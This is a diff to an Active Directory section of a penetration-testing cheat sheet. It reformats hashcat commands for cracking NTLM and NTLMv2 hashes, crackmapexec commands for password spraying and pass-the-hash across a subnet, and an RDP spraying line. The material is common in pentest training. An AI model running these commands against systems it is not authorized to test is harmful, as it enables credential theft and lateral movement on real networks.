@@ -560,17 +560,14 @@ Active Directory
 
 `Cracking Ad Hashes`
 
--    ntlm  
-     `hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`  
-
--    ntlmv2  
-     `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`  
+         ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt`  
+         ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`  
 <br>
 
 `PASS THE PW & HASH`
 
--    `crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>`  
--    `crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local`  
+         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
+         crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
 
 `Token Impersonation`
      
@@ -592,7 +589,7 @@ Active Directory
  -   Create Password List  
      `crunchy <length> <length> -t <pw-core>%%%% `
    
--    Spray
+-    Spray  
      `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
      
 <br>
